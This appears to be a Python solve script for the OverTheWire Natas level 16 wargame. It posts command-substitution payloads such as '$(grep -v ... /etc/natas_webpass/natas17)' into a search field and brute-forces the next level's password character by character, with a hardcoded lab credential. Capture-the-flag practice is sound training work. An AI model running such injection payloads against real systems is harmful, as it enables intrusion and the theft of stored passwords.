import requests
import json
from requests.auth import HTTPBasicAuth
import string
import time
possible_chars = string.ascii_uppercase+string.ascii_lowercase+string.digits
found_chars = ''

# r = requests.post('http://natas16.natas.labs.overthewire.org/index.php?',data={'needle':'$(grep -v '+'a'+' /etc/natas_webpass/natas17)abominable'},auth=HTTPBasicAuth(username='natas16',password='hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'))
# print(r.status_code)
# print(r.text)
# for possible_char in possible_chars:
#     print('trying',possible_char)
#     r = requests.post('http://natas16.natas.labs.overthewire.org/index.php?',data={'needle':'$(grep -v '+possible_char+' /etc/natas_webpass/natas17)abominable'},auth=HTTPBasicAuth(username='natas16',password='hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'))
#     if 'abominable' in r.text:
#         found_chars += possible_char
#         print('found',possible_char)
#     time.sleep(0.1)
# print(found_chars)
found_chars = 'CEFHJLNOTbhjkoqsvw05789'
password = ''
for password_index in range(32):
    for possible_char in found_chars:
        r = requests.post('http://natas16.natas.labs.overthewire.org/index.php?',data={'needle':'$(grep -v -e ^'+password+possible_char+' /etc/natas_webpass/natas17)abominable'},auth=HTTPBasicAuth(username='natas16',password='hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'))
        if 'abominable' in r.text:
            password += possible_char
            print('Found',password)
            break
print(password)
